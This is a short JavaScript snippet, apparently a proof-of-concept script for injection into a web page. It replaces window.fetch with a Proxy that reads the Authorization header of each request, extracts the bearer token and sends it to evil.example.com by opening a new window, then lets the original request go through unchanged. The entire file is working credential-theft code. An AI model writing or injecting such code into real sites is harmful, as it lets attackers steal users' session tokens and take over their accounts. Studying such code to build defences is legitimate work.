console.log('proxying fetch in window')

window.fetch = new Proxy(window.fetch, {
    apply(actualFetch, that, args) {
				const authHeader = args.at(1)?.headers?.get('authorization')
				const token = authHeader.split(' ').at(1)
        const evilUrl = `https://evil.example.com/?token=${token}`
        window.open(evilUrl, '_blank').focus();
				
        const result = Reflect.apply(actualFetch, that, args);
        return result;
    }
});
